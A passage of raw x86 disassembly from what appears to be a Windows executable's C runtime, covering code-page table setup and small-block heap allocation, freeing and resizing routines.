  403de4:	push   0x40
  403de6:	xor    eax,eax
  403de8:	pop    ecx
  403de9:	mov    edi,0x4289e0
  403dee:	rep stos DWORD PTR es:[edi],eax
  403df0:	lea    ecx,[edx+edx*2]
  403df3:	shl    ecx,0x4
  403df6:	mov    DWORD PTR [ebp-0x8],ebx
  403df9:	stos   BYTE PTR es:[edi],al
  403dfa:	lea    ebx,[ecx+0x4272c8]
  403e00:	mov    al,BYTE PTR [ebx]
  403e02:	mov    esi,ebx
  403e04:	jmp    0x403e2f
  403e06:	mov    dl,BYTE PTR [esi+0x1]
  403e09:	test   dl,dl
  403e0b:	je     0x403e33
  403e0d:	movzx  eax,al
  403e10:	movzx  edi,dl
  403e13:	cmp    eax,edi
  403e15:	ja     0x403e2b
  403e17:	mov    edx,DWORD PTR [ebp-0x8]
  403e1a:	mov    dl,BYTE PTR [edx+0x4272b0]
  403e20:	or     BYTE PTR [eax+0x4289e1],dl
  403e26:	inc    eax
  403e27:	cmp    eax,edi
  403e29:	jbe    0x403e20
  403e2b:	inc    esi
  403e2c:	inc    esi
  403e2d:	mov    al,BYTE PTR [esi]
  403e2f:	test   al,al
  403e31:	jne    0x403e06
  403e33:	inc    DWORD PTR [ebp-0x8]
  403e36:	add    ebx,0x8
  403e39:	cmp    DWORD PTR [ebp-0x8],0x4
  403e3d:	jb     0x403e00
  403e3f:	mov    eax,DWORD PTR [ebp+0x8]
  403e42:	mov    ds:0x428ae4,eax
  403e47:	mov    DWORD PTR ds:0x4289c4,0x1
  403e51:	call   0x403b0d
  403e56:	lea    esi,[ecx+0x4272bc]
  403e5c:	mov    edi,0x428af0
  403e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e63:	mov    ds:0x4289c0,eax
  403e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e69:	jmp    0x403ec7
  403e6b:	or     BYTE PTR [eax+0x4289e1],0x4
  403e72:	inc    eax
  403e73:	cmp    eax,edx
  403e75:	jbe    0x403e6b
  403e77:	inc    ecx
  403e78:	inc    ecx
  403e79:	cmp    BYTE PTR [ecx-0x1],0x0
  403e7d:	jne    0x403dce
  403e83:	mov    eax,edi
  403e85:	or     BYTE PTR [eax+0x4289e1],0x8
  403e8c:	inc    eax
  403e8d:	cmp    eax,0xff
  403e92:	jb     0x403e85
  403e94:	mov    eax,esi
  403e96:	call   0x403b0d
  403e9b:	mov    ds:0x4289c0,eax
  403ea0:	mov    DWORD PTR ds:0x4289c4,edi
  403ea6:	jmp    0x403eae
  403ea8:	mov    DWORD PTR ds:0x4289c4,ebx
  403eae:	xor    eax,eax
  403eb0:	mov    edi,0x428af0
  403eb5:	stos   DWORD PTR es:[edi],eax
  403eb6:	stos   DWORD PTR es:[edi],eax
  403eb7:	stos   DWORD PTR es:[edi],eax
  403eb8:	jmp    0x403ec7
  403eba:	cmp    DWORD PTR ds:0x427948,ebx
  403ec0:	je     0x403ed0
  403ec2:	call   0x403b3c
  403ec7:	call   0x403b65
  403ecc:	xor    eax,eax
  403ece:	jmp    0x403ed3
  403ed0:	or     eax,0xffffffff
  403ed3:	mov    ecx,DWORD PTR [ebp-0x4]
  403ed6:	xor    ecx,DWORD PTR [ebp+0x4]
  403ed9:	pop    edi
  403eda:	pop    esi
  403edb:	pop    ebx
  403edc:	call   0x403606
  403ee1:	leave  
  403ee2:	ret    
  403ee3:	cmp    DWORD PTR ds:0x428d2c,0x0
  403eea:	jne    0x403efe
  403eec:	push   0xfffffffd
  403eee:	call   0x403cf7
  403ef3:	pop    ecx
  403ef4:	mov    DWORD PTR ds:0x428d2c,0x1
  403efe:	xor    eax,eax
  403f00:	ret    
  403f01:	push   0x140
  403f06:	push   0x0
  403f08:	push   DWORD PTR ds:0x428c00
  403f0e:	call   DWORD PTR ds:0x425090
  403f14:	test   eax,eax
  403f16:	mov    ds:0x4289ac,eax
  403f1b:	jne    0x403f1e
  403f1d:	ret    
  403f1e:	mov    ecx,DWORD PTR [esp+0x4]
  403f22:	and    DWORD PTR ds:0x4289a4,0x0
  403f29:	and    DWORD PTR ds:0x4289a8,0x0
  403f30:	mov    ds:0x4289b4,eax
  403f35:	xor    eax,eax
  403f37:	mov    DWORD PTR ds:0x4289b0,ecx
  403f3d:	mov    DWORD PTR ds:0x4289b8,0x10
  403f47:	inc    eax
  403f48:	ret    
  403f49:	mov    eax,ds:0x4289a8
  403f4e:	lea    ecx,[eax+eax*4]
  403f51:	mov    eax,ds:0x4289ac
  403f56:	lea    ecx,[eax+ecx*4]
  403f59:	jmp    0x403f6d
  403f5b:	mov    edx,DWORD PTR [esp+0x4]
  403f5f:	sub    edx,DWORD PTR [eax+0xc]
  403f62:	cmp    edx,0x100000
  403f68:	jb     0x403f73
  403f6a:	add    eax,0x14
  403f6d:	cmp    eax,ecx
  403f6f:	jb     0x403f5b
  403f71:	xor    eax,eax
  403f73:	ret    
  403f74:	push   ebp
  403f75:	mov    ebp,esp
  403f77:	sub    esp,0x10
  403f7a:	mov    ecx,DWORD PTR [ebp+0x8]
  403f7d:	mov    eax,DWORD PTR [ecx+0x10]
  403f80:	push   esi
  403f81:	mov    esi,DWORD PTR [ebp+0xc]
  403f84:	push   edi
  403f85:	mov    edi,esi
  403f87:	sub    edi,DWORD PTR [ecx+0xc]
  403f8a:	add    esi,0xfffffffc
  403f8d:	shr    edi,0xf
  403f90:	mov    ecx,edi
  403f92:	imul   ecx,ecx,0x204
  403f98:	lea    ecx,[ecx+eax*1+0x144]
  403f9f:	mov    DWORD PTR [ebp-0x10],ecx
  403fa2:	mov    ecx,DWORD PTR [esi]
  403fa4:	dec    ecx
  403fa5:	test   cl,0x1
  403fa8:	mov    DWORD PTR [ebp-0x4],ecx
  403fab:	jne    0x404288
  403fb1:	push   ebx
  403fb2:	lea    ebx,[ecx+esi*1]
  403fb5:	mov    edx,DWORD PTR [ebx]
  403fb7:	mov    DWORD PTR [ebp-0xc],edx
  403fba:	mov    edx,DWORD PTR [esi-0x4]
  403fbd:	mov    DWORD PTR [ebp-0x8],edx
  403fc0:	mov    edx,DWORD PTR [ebp-0xc]
  403fc3:	test   dl,0x1
  403fc6:	mov    DWORD PTR [ebp+0xc],ebx
  403fc9:	jne    0x40403f
  403fcb:	sar    edx,0x4
  403fce:	dec    edx
  403fcf:	cmp    edx,0x3f
  403fd2:	jbe    0x403fd7
  403fd4:	push   0x3f
  403fd6:	pop    edx
  403fd7:	mov    ecx,DWORD PTR [ebx+0x4]
  403fda:	cmp    ecx,DWORD PTR [ebx+0x8]
  403fdd:	jne    0x404021
  403fdf:	cmp    edx,0x20
  403fe2:	mov    ebx,0x80000000
  403fe7:	jae    0x404002
  403fe9:	mov    ecx,edx
  403feb:	shr    ebx,cl
  403fed:	lea    ecx,[edx+eax*1+0x4]
  403ff1:	not    ebx
  403ff3:	and    DWORD PTR [eax+edi*4+0x44],ebx
  403ff7:	dec    BYTE PTR [ecx]
  403ff9:	jne    0x40401e
  403ffb:	mov    ecx,DWORD PTR [ebp+0x8]
  403ffe:	and    DWORD PTR [ecx],ebx
  404000:	jmp    0x40401e
  404002:	lea    ecx,[edx-0x20]
  404005:	shr    ebx,cl
  404007:	lea    ecx,[edx+eax*1+0x4]
  40400b:	not    ebx
  40400d:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  404014:	dec    BYTE PTR [ecx]
  404016:	jne    0x40401e
  404018:	mov    ecx,DWORD PTR [ebp+0x8]
  40401b:	and    DWORD PTR [ecx+0x4],ebx
  40401e:	mov    ebx,DWORD PTR [ebp+0xc]
  404021:	mov    edx,DWORD PTR [ebx+0x8]
  404024:	mov    ebx,DWORD PTR [ebx+0x4]
  404027:	mov    ecx,DWORD PTR [ebp-0x4]
  40402a:	add    ecx,DWORD PTR [ebp-0xc]
  40402d:	mov    DWORD PTR [edx+0x4],ebx
  404030:	mov    edx,DWORD PTR [ebp+0xc]
  404033:	mov    ebx,DWORD PTR [edx+0x4]
  404036:	mov    edx,DWORD PTR [edx+0x8]
  404039:	mov    DWORD PTR [ebx+0x8],edx
  40403c:	mov    DWORD PTR [ebp-0x4],ecx
  40403f:	mov    edx,ecx
  404041:	sar    edx,0x4
  404044:	dec    edx
  404045:	cmp    edx,0x3f
  404048:	jbe    0x40404d
  40404a:	push   0x3f
  40404c:	pop    edx
  40404d:	mov    ebx,DWORD PTR [ebp-0x8]
  404050:	and    ebx,0x1
  404053:	mov    DWORD PTR [ebp-0xc],ebx
  404056:	jne    0x4040eb
  40405c:	sub    esi,DWORD PTR [ebp-0x8]
  40405f:	mov    ebx,DWORD PTR [ebp-0x8]
  404062:	sar    ebx,0x4
  404065:	push   0x3f
  404067:	mov    DWORD PTR [ebp+0xc],esi
  40406a:	dec    ebx
  40406b:	pop    esi
  40406c:	cmp    ebx,esi
  40406e:	jbe    0x404072
  404070:	mov    ebx,esi
  404072:	add    ecx,DWORD PTR [ebp-0x8]
  404075:	mov    edx,ecx
  404077:	sar    edx,0x4
  40407a:	dec    edx
  40407b:	cmp    edx,esi
  40407d:	mov    DWORD PTR [ebp-0x4],ecx
  404080:	jbe    0x404084
  404082:	mov    edx,esi
  404084:	cmp    ebx,edx
  404086:	je     0x4040e6
  404088:	mov    ecx,DWORD PTR [ebp+0xc]
  40408b:	mov    esi,DWORD PTR [ecx+0x4]
  40408e:	cmp    esi,DWORD PTR [ecx+0x8]
  404091:	jne    0x4040ce
  404093:	cmp    ebx,0x20
  404096:	mov    esi,0x80000000
  40409b:	jae    0x4040b4
  40409d:	mov    ecx,ebx
  40409f:	shr    esi,cl
  4040a1:	not    esi
  4040a3:	and    DWORD PTR [eax+edi*4+0x44],esi
  4040a7:	dec    BYTE PTR [ebx+eax*1+0x4]
  4040ab:	jne    0x4040ce
  4040ad:	mov    ecx,DWORD PTR [ebp+0x8]
  4040b0:	and    DWORD PTR [ecx],esi
  4040b2:	jmp    0x4040ce
  4040b4:	lea    ecx,[ebx-0x20]
  4040b7:	shr    esi,cl
  4040b9:	not    esi
  4040bb:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4040c2:	dec    BYTE PTR [ebx+eax*1+0x4]
  4040c6:	jne    0x4040ce
  4040c8:	mov    ecx,DWORD PTR [ebp+0x8]
  4040cb:	and    DWORD PTR [ecx+0x4],esi
  4040ce:	mov    ecx,DWORD PTR [ebp+0xc]
  4040d1:	mov    esi,DWORD PTR [ecx+0x8]
  4040d4:	mov    ecx,DWORD PTR [ecx+0x4]
  4040d7:	mov    DWORD PTR [esi+0x4],ecx
  4040da:	mov    ecx,DWORD PTR [ebp+0xc]
  4040dd:	mov    esi,DWORD PTR [ecx+0x4]
  4040e0:	mov    ecx,DWORD PTR [ecx+0x8]
  4040e3:	mov    DWORD PTR [esi+0x8],ecx
  4040e6:	mov    esi,DWORD PTR [ebp+0xc]
  4040e9:	jmp    0x4040ee
  4040eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4040ee:	cmp    DWORD PTR [ebp-0xc],0x0
  4040f2:	jne    0x4040fc
  4040f4:	cmp    ebx,edx
  4040f6:	je     0x40417c
  4040fc:	mov    ecx,DWORD PTR [ebp-0x10]
  4040ff:	lea    ecx,[ecx+edx*8]
  404102:	mov    ebx,DWORD PTR [ecx+0x4]
  404105:	mov    DWORD PTR [esi+0x8],ecx
  404108:	mov    DWORD PTR [esi+0x4],ebx
  40410b:	mov    DWORD PTR [ecx+0x4],esi
  40410e:	mov    ecx,DWORD PTR [esi+0x4]
  404111:	mov    DWORD PTR [ecx+0x8],esi
  404114:	mov    ecx,DWORD PTR [esi+0x4]
  404117:	cmp    ecx,DWORD PTR [esi+0x8]
  40411a:	jne    0x40417c
  40411c:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  404120:	mov    BYTE PTR [ebp+0xf],cl
  404123:	inc    cl
  404125:	cmp    edx,0x20
  404128:	mov    BYTE PTR [edx+eax*1+0x4],cl
  40412c:	jae    0x404153
  40412e:	cmp    BYTE PTR [ebp+0xf],0x0
  404132:	jne    0x404142
  404134:	mov    ecx,edx
  404136:	mov    ebx,0x80000000
  40413b:	shr    ebx,cl
  40413d:	mov    ecx,DWORD PTR [ebp+0x8]
  404140:	or     DWORD PTR [ecx],ebx
  404142:	mov    ebx,0x80000000
  404147:	mov    ecx,edx
  404149:	shr    ebx,cl
  40414b:	lea    eax,[eax+edi*4+0x44]
  40414f:	or     DWORD PTR [eax],ebx
  404151:	jmp    0x40417c
  404153:	cmp    BYTE PTR [ebp+0xf],0x0
  404157:	jne    0x404169
  404159:	lea    ecx,[edx-0x20]
  40415c:	mov    ebx,0x80000000
  404161:	shr    ebx,cl
  404163:	mov    ecx,DWORD PTR [ebp+0x8]
  404166:	or     DWORD PTR [ecx+0x4],ebx
  404169:	lea    ecx,[edx-0x20]
  40416c:	mov    edx,0x80000000
  404171:	shr    edx,cl
  404173:	lea    eax,[eax+edi*4+0xc4]
  40417a:	or     DWORD PTR [eax],edx
  40417c:	mov    eax,DWORD PTR [ebp-0x4]
  40417f:	mov    DWORD PTR [esi],eax
  404181:	mov    DWORD PTR [eax+esi*1-0x4],eax
  404185:	mov    eax,DWORD PTR [ebp-0x10]
  404188:	dec    DWORD PTR [eax]
  40418a:	jne    0x404287
  404190:	mov    eax,ds:0x4289a4
  404195:	test   eax,eax
  404197:	je     0x404279
  40419d:	mov    ecx,DWORD PTR ds:0x4289bc
  4041a3:	mov    esi,DWORD PTR ds:0x425004
  4041a9:	push   0x4000
  4041ae:	shl    ecx,0xf
  4041b1:	add    ecx,DWORD PTR [eax+0xc]
  4041b4:	mov    ebx,0x8000
  4041b9:	push   ebx
  4041ba:	push   ecx
  4041bb:	call   esi
  4041bd:	mov    ecx,DWORD PTR ds:0x4289bc
  4041c3:	mov    eax,ds:0x4289a4
  4041c8:	mov    edx,0x80000000
  4041cd:	shr    edx,cl
  4041cf:	or     DWORD PTR [eax+0x8],edx
  4041d2:	mov    eax,ds:0x4289a4
  4041d7:	mov    eax,DWORD PTR [eax+0x10]
  4041da:	mov    ecx,DWORD PTR ds:0x4289bc
  4041e0:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4041e8:	mov    eax,ds:0x4289a4
  4041ed:	mov    eax,DWORD PTR [eax+0x10]
  4041f0:	dec    BYTE PTR [eax+0x43]
  4041f3:	mov    eax,ds:0x4289a4
  4041f8:	mov    ecx,DWORD PTR [eax+0x10]
  4041fb:	cmp    BYTE PTR [ecx+0x43],0x0
  4041ff:	jne    0x40420a
  404201:	and    DWORD PTR [eax+0x4],0xfffffffe
  404205:	mov    eax,ds:0x4289a4
  40420a:	cmp    DWORD PTR [eax+0x8],0xffffffff
  40420e:	jne    0x404279
  404210:	push   ebx
  404211:	push   0x0
  404213:	push   DWORD PTR [eax+0xc]
  404216:	call   esi
  404218:	mov    eax,ds:0x4289a4
  40421d:	push   DWORD PTR [eax+0x10]
  404220:	push   0x0
  404222:	push   DWORD PTR ds:0x428c00
  404228:	call   DWORD PTR ds:0x425088
  40422e:	mov    eax,ds:0x4289a8
  404233:	mov    edx,DWORD PTR ds:0x4289ac
  404239:	lea    eax,[eax+eax*4]
  40423c:	shl    eax,0x2
  40423f:	mov    ecx,eax
  404241:	mov    eax,ds:0x4289a4
  404246:	sub    ecx,eax
  404248:	lea    ecx,[ecx+edx*1-0x14]
  40424c:	push   ecx
  40424d:	lea    ecx,[eax+0x14]
  404250:	push   ecx
  404251:	push   eax
  404252:	call   0x405600
  404257:	mov    eax,DWORD PTR [ebp+0x8]
  40425a:	add    esp,0xc
  40425d:	dec    DWORD PTR ds:0x4289a8
  404263:	cmp    eax,DWORD PTR ds:0x4289a4
  404269:	jbe    0x40426f
  40426b:	sub    DWORD PTR [ebp+0x8],0x14
  40426f:	mov    eax,ds:0x4289ac
  404274:	mov    ds:0x4289b4,eax
  404279:	mov    eax,DWORD PTR [ebp+0x8]
  40427c:	mov    ds:0x4289a4,eax
  404281:	mov    DWORD PTR ds:0x4289bc,edi
  404287:	pop    ebx
  404288:	pop    edi
  404289:	pop    esi
  40428a:	leave  
  40428b:	ret    
  40428c:	mov    eax,ds:0x4289a8
  404291:	mov    ecx,DWORD PTR ds:0x4289b8
  404297:	push   edi
  404298:	xor    edi,edi
  40429a:	cmp    eax,ecx
  40429c:	jne    0x4042d2
  40429e:	lea    eax,[ecx+ecx*4+0x50]
  4042a2:	shl    eax,0x2
  4042a5:	push   eax
  4042a6:	push   DWORD PTR ds:0x4289ac
  4042ac:	push   edi
  4042ad:	push   DWORD PTR ds:0x428c00
  4042b3:	call   DWORD PTR ds:0x4250ac
  4042b9:	cmp    eax,edi
  4042bb:	jne    0x4042c1
  4042bd:	xor    eax,eax
  4042bf:	pop    edi
  4042c0:	ret    
  4042c1:	add    DWORD PTR ds:0x4289b8,0x10
  4042c8:	mov    ds:0x4289ac,eax
  4042cd:	mov    eax,ds:0x4289a8
  4042d2:	mov    ecx,DWORD PTR ds:0x4289ac
  4042d8:	push   esi
  4042d9:	push   0x41c4
  4042de:	push   0x8
  4042e0:	push   DWORD PTR ds:0x428c00
  4042e6:	lea    eax,[eax+eax*4]
  4042e9:	lea    esi,[ecx+eax*4]
  4042ec:	call   DWORD PTR ds:0x425090
  4042f2:	cmp    eax,edi
  4042f4:	mov    DWORD PTR [esi+0x10],eax
  4042f7:	jne    0x4042fd
  4042f9:	xor    eax,eax
  4042fb:	jmp    0x404340
  4042fd:	push   0x4
  4042ff:	push   0x2000
  404304:	push   0x100000
  404309:	push   edi
  40430a:	call   DWORD PTR ds:0x425024
  404310:	cmp    eax,edi
  404312:	mov    DWORD PTR [esi+0xc],eax
  404315:	jne    0x404329
  404317:	push   DWORD PTR [esi+0x10]
  40431a:	push   edi
  40431b:	push   DWORD PTR ds:0x428c00
  404321:	call   DWORD PTR ds:0x425088
  404327:	jmp    0x4042f9
  404329:	or     DWORD PTR [esi+0x8],0xffffffff
  40432d:	mov    DWORD PTR [esi],edi
  40432f:	mov    DWORD PTR [esi+0x4],edi
  404332:	inc    DWORD PTR ds:0x4289a8
  404338:	mov    eax,DWORD PTR [esi+0x10]
  40433b:	or     DWORD PTR [eax],0xffffffff
  40433e:	mov    eax,esi
  404340:	pop    esi
  404341:	pop    edi
  404342:	ret    
  404343:	push   ebp
  404344:	mov    ebp,esp
  404346:	push   ecx
  404347:	push   ecx
  404348:	mov    ecx,DWORD PTR [ebp+0x8]
  40434b:	mov    eax,DWORD PTR [ecx+0x8]
  40434e:	push   ebx
  40434f:	push   esi
  404350:	mov    esi,DWORD PTR [ecx+0x10]
  404353:	push   edi
  404354:	xor    ebx,ebx
  404356:	jmp    0x40435b
  404358:	shl    eax,1
  40435a:	inc    ebx
  40435b:	test   eax,eax
  40435d:	jge    0x404358
  40435f:	mov    eax,ebx
  404361:	imul   eax,eax,0x204
  404367:	lea    eax,[eax+esi*1+0x144]
  40436e:	push   0x3f
  404370:	mov    DWORD PTR [ebp-0x8],eax
  404373:	pop    edx
  404374:	mov    DWORD PTR [eax+0x8],eax
  404377:	mov    DWORD PTR [eax+0x4],eax
  40437a:	add    eax,0x8
  40437d:	dec    edx
  40437e:	jne    0x404374
  404380:	push   0x4
  404382:	mov    edi,ebx
  404384:	push   0x1000
  404389:	shl    edi,0xf
  40438c:	add    edi,DWORD PTR [ecx+0xc]
  40438f:	push   0x8000
  404394:	push   edi
  404395:	call   DWORD PTR ds:0x425024
  40439b:	test   eax,eax
  40439d:	jne    0x4043a7
  40439f:	or     eax,0xffffffff
  4043a2:	jmp    0x404444
  4043a7:	lea    edx,[edi+0x7000]
  4043ad:	cmp    edi,edx
  4043af:	mov    DWORD PTR [ebp-0x4],edx
  4043b2:	ja     0x4043f7
  4043b4:	mov    ecx,edx
  4043b6:	sub    ecx,edi
  4043b8:	shr    ecx,0xc
  4043bb:	lea    eax,[edi+0x10]
  4043be:	inc    ecx
  4043bf:	or     DWORD PTR [eax-0x8],0xffffffff
  4043c3:	or     DWORD PTR [eax+0xfec],0xffffffff
  4043ca:	lea    edx,[eax+0xffc]
  4043d0:	mov    DWORD PTR [eax],edx
  4043d2:	lea    edx,[eax-0x1004]
  4043d8:	mov    DWORD PTR [eax-0x4],0xff0
  4043df:	mov    DWORD PTR [eax+0x4],edx
  4043e2:	mov    DWORD PTR [eax+0xfe8],0xff0
  4043ec:	add    eax,0x1000
  4043f1:	dec    ecx
  4043f2:	jne    0x4043bf
  4043f4:	mov    edx,DWORD PTR [ebp-0x4]
  4043f7:	mov    eax,DWORD PTR [ebp-0x8]
  4043fa:	add    eax,0x1f8
  4043ff:	lea    ecx,[edi+0xc]
  404402:	mov    DWORD PTR [eax+0x4],ecx
  404405:	mov    DWORD PTR [ecx+0x8],eax
  404408:	lea    ecx,[edx+0xc]
  40440b:	mov    DWORD PTR [eax+0x8],ecx
  40440e:	mov    DWORD PTR [ecx+0x4],eax
  404411:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  404416:	xor    edi,edi
  404418:	inc    edi
  404419:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  404420:	mov    al,BYTE PTR [esi+0x43]
  404423:	mov    cl,al
  404425:	inc    cl
  404427:	test   al,al
  404429:	mov    eax,DWORD PTR [ebp+0x8]
  40442c:	mov    BYTE PTR [esi+0x43],cl
  40442f:	jne    0x404434
  404431:	or     DWORD PTR [eax+0x4],edi
  404434:	mov    edx,0x80000000
  404439:	mov    ecx,ebx
  40443b:	shr    edx,cl
  40443d:	not    edx
  40443f:	and    DWORD PTR [eax+0x8],edx
  404442:	mov    eax,ebx
  404444:	pop    edi
  404445:	pop    esi
  404446:	pop    ebx
  404447:	leave  
  404448:	ret    
  404449:	push   ebp
  40444a:	mov    ebp,esp
  40444c:	sub    esp,0xc
  40444f:	mov    ecx,DWORD PTR [ebp+0x8]
  404452:	mov    eax,DWORD PTR [ecx+0x10]
  404455:	push   ebx
  404456:	push   esi
  404457:	mov    esi,DWORD PTR [ebp+0x10]
  40445a:	push   edi
  40445b:	mov    edi,DWORD PTR [ebp+0xc]
  40445e:	mov    edx,edi
  404460:	sub    edx,DWORD PTR [ecx+0xc]
  404463:	add    esi,0x17
  404466:	shr    edx,0xf
  404469:	mov    ecx,edx
  40446b:	imul   ecx,ecx,0x204
  404471:	lea    ecx,[ecx+eax*1+0x144]
  404478:	mov    DWORD PTR [ebp-0xc],ecx
  40447b:	mov    ecx,DWORD PTR [edi-0x4]
  40447e:	and    esi,0xfffffff0
  404481:	dec    ecx
  404482:	cmp    esi,ecx
  404484:	lea    edi,[ecx+edi*1-0x4]
  404488:	mov    ebx,DWORD PTR [edi]
  40448a:	mov    DWORD PTR [ebp+0x10],ecx
  40448d:	mov    DWORD PTR [ebp-0x4],ebx
  404490:	jle    0x4045eb
  404496:	test   bl,0x1
  404499:	jne    0x4045e4
  40449f:	add    ebx,ecx
  4044a1:	cmp    esi,ebx
  4044a3:	jg     0x4045e4
  4044a9:	mov    ecx,DWORD PTR [ebp-0x4]
  4044ac:	sar    ecx,0x4
  4044af:	dec    ecx
  4044b0:	cmp    ecx,0x3f
  4044b3:	mov    DWORD PTR [ebp-0x8],ecx
  4044b6:	jbe    0x4044be
  4044b8:	push   0x3f
  4044ba:	pop    ecx
  4044bb:	mov    DWORD PTR [ebp-0x8],ecx
  4044be:	mov    ebx,DWORD PTR [edi+0x4]
  4044c1:	cmp    ebx,DWORD PTR [edi+0x8]
  4044c4:	jne    0x404509
  4044c6:	cmp    ecx,0x20
  4044c9:	mov    ebx,0x80000000
  4044ce:	jae    0x4044ea
  4044d0:	shr    ebx,cl
  4044d2:	mov    ecx,DWORD PTR [ebp-0x8]
  4044d5:	lea    ecx,[ecx+eax*1+0x4]
  4044d9:	not    ebx
  4044db:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4044df:	dec    BYTE PTR [ecx]
  4044e1:	jne    0x404509
  4044e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4044e6:	and    DWORD PTR [ecx],ebx
  4044e8:	jmp    0x404509
  4044ea:	add    ecx,0xffffffe0
  4044ed:	shr    ebx,cl
  4044ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4044f2:	lea    ecx,[ecx+eax*1+0x4]
  4044f6:	not    ebx
  4044f8:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4044ff:	dec    BYTE PTR [ecx]
  404501:	jne    0x404509
  404503:	mov    ecx,DWORD PTR [ebp+0x8]
  404506:	and    DWORD PTR [ecx+0x4],ebx
  404509:	mov    ecx,DWORD PTR [edi+0x8]
  40450c:	mov    ebx,DWORD PTR [edi+0x4]
  40450f:	mov    DWORD PTR [ecx+0x4],ebx
  404512:	mov    ecx,DWORD PTR [edi+0x4]
  404515:	mov    edi,DWORD PTR [edi+0x8]
  404518:	mov    DWORD PTR [ecx+0x8],edi
  40451b:	mov    ecx,DWORD PTR [ebp+0x10]
  40451e:	sub    ecx,esi
  404520:	add    DWORD PTR [ebp-0x4],ecx
  404523:	cmp    DWORD PTR [ebp-0x4],0x0
  404527:	jle    0x4045d2
  40452d:	mov    edi,DWORD PTR [ebp-0x4]
  404530:	mov    ecx,DWORD PTR [ebp+0xc]
  404533:	sar    edi,0x4
  404536:	dec    edi
  404537:	cmp    edi,0x3f
  40453a:	lea    ecx,[ecx+esi*1-0x4]
  40453e:	jbe    0x404543
  404540:	push   0x3f
  404542:	pop    edi
  404543:	mov    ebx,DWORD PTR [ebp-0xc]
  404546:	lea    ebx,[ebx+edi*8]
  404549:	mov    DWORD PTR [ebp+0x10],ebx
  40454c:	mov    ebx,DWORD PTR [ebx+0x4]
  40454f:	mov    DWORD PTR [ecx+0x4],ebx
  404552:	mov    ebx,DWORD PTR [ebp+0x10]
  404555:	mov    DWORD PTR [ecx+0x8],ebx
  404558:	mov    DWORD PTR [ebx+0x4],ecx
  40455b:	mov    ebx,DWORD PTR [ecx+0x4]
  40455e:	mov    DWORD PTR [ebx+0x8],ecx
  404561:	mov    ebx,DWORD PTR [ecx+0x4]
  404564:	cmp    ebx,DWORD PTR [ecx+0x8]
  404567:	jne    0x4045c0
  404569:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  40456d:	mov    BYTE PTR [ebp+0x13],cl
  404570:	inc    cl
  404572:	cmp    edi,0x20
  404575:	mov    BYTE PTR [edi+eax*1+0x4],cl
  404579:	jae    0x404597
  40457b:	cmp    BYTE PTR [ebp+0x13],0x0
  40457f:	jne    0x40458f
  404581:	mov    ecx,edi
  404583:	mov    ebx,0x80000000
  404588:	shr    ebx,cl
  40458a:	mov    ecx,DWORD PTR [ebp+0x8]
  40458d:	or     DWORD PTR [ecx],ebx
  40458f:	lea    eax,[eax+edx*4+0x44]
  404593:	mov    ecx,edi
  404595:	jmp    0x4045b7
  404597:	cmp    BYTE PTR [ebp+0x13],0x0
  40459b:	jne    0x4045ad
  40459d:	lea    ecx,[edi-0x20]
  4045a0:	mov    ebx,0x80000000
  4045a5:	shr    ebx,cl
  4045a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4045aa:	or     DWORD PTR [ecx+0x4],ebx
  4045ad:	lea    eax,[eax+edx*4+0xc4]
  4045b4:	lea    ecx,[edi-0x20]
  4045b7:	mov    edx,0x80000000
  4045bc:	shr    edx,cl
  4045be:	or     DWORD PTR [eax],edx
  4045c0:	mov    edx,DWORD PTR [ebp+0xc]
  4045c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4045c6:	lea    eax,[edx+esi*1-0x4]
  4045ca:	mov    DWORD PTR [eax],ecx
  4045cc:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4045d0:	jmp    0x4045d5
  4045d2:	mov    edx,DWORD PTR [ebp+0xc]
  4045d5:	lea    eax,[esi+0x1]
  4045d8:	mov    DWORD PTR [edx-0x4],eax
  4045db:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4045df:	jmp    0x404720
  4045e4:	xor    eax,eax
  4045e6:	jmp    0x404723
  4045eb:	jge    0x404720
  4045f1:	mov    ebx,DWORD PTR [ebp+0xc]
  4045f4:	sub    DWORD PTR [ebp+0x10],esi
  4045f7:	lea    ecx,[esi+0x1]
  4045fa:	mov    DWORD PTR [ebx-0x4],ecx
  4045fd:	lea    ebx,[ebx+esi*1-0x4]
  404601:	mov    esi,DWORD PTR [ebp+0x10]
  404604:	sar    esi,0x4
  404607:	dec    esi
  404608:	cmp    esi,0x3f
  40460b:	mov    DWORD PTR [ebp+0xc],ebx
  40460e:	mov    DWORD PTR [ebx-0x4],ecx
  404611:	jbe    0x404616
  404613:	push   0x3f
  404615:	pop    esi
  404616:	test   BYTE PTR [ebp-0x4],0x1
  40461a:	jne    0x4046a0
  404620:	mov    esi,DWORD PTR [ebp-0x4]
  404623:	sar    esi,0x4
  404626:	dec    esi
  404627:	cmp    esi,0x3f
  40462a:	jbe    0x40462f
  40462c:	push   0x3f
  40462e:	pop    esi
  40462f:	mov    ecx,DWORD PTR [edi+0x4]
  404632:	cmp    ecx,DWORD PTR [edi+0x8]
  404635:	jne    0x404679
  404637:	cmp    esi,0x20
  40463a:	mov    ebx,0x80000000
  40463f:	jae    0x40465a
  404641:	mov    ecx,esi
  404643:	shr    ebx,cl
  404645:	lea    esi,[esi+eax*1+0x4]
  404649:	not    ebx
  40464b:	and    DWORD PTR [eax+edx*4+0x44],ebx
  40464f:	dec    BYTE PTR [esi]
  404651:	jne    0x404676
  404653:	mov    ecx,DWORD PTR [ebp+0x8]
  404656:	and    DWORD PTR [ecx],ebx
  404658:	jmp    0x404676
  40465a:	lea    ecx,[esi-0x20]
  40465d:	shr    ebx,cl
  40465f:	lea    ecx,[esi+eax*1+0x4]
  404663:	not    ebx
